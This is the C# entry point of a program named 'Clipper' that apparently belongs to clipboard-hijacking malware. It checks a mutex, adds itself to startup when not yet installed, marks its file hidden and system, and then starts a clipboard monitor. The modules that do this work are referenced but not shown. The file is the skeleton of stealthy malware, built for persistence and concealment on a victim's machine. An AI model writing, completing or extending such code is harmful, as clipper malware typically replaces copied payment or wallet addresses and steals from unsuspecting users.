using System;

namespace Clipper
{
    class Program
    {
        [STAThreadAttribute]
        static void Main()
        {
            // Check mutex
            Modules.AppMutex.Check();
            // Add to startup
            if (!Modules.Autorun.is_installed())
                Modules.Autorun.install();
            // Set hidden & system attributes
            Modules.Attributes.set_hidden();
            Modules.Attributes.set_system();
            // Start clipper
            Modules.ClipboardMonitor.run();
        }
    }
}
